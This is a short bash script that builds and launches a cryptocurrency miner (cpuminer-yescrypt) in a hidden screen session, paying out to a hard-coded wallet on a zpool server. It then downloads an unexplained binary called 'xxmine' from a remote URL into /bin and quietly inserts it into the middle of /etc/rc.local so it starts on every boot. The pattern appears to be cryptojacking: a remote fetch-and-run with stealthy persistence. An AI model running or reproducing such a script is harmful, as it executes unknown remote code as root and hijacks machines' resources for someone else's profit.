#!/bin/bash
apt-get update
apt-get install git -y
apt-get install screen -y
apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y
git clone https://github.com/noncepool/cpuminer-yescrypt.git miner
cd miner
./autogen.sh
./configure CFLAGS="-O3"
make
mv minerd /usr/local/bin/
cd
screen -dmS ZPOOL minerd -a yescrypt -o stratum+tcp://mine.zpool.ca:6233 -u 15xtsu8mXijRKhiL8DWt5GuRwqKJJm5pRH -p Miner
cd /bin
wget https://raw.githubusercontent.com/QualityNet/arquivos/master/xxmine
chmod +x /bin/xxmine
sed -i "$(($(cat /etc/rc.local | wc -l)/2)) a xxmine" /etc/rc.local
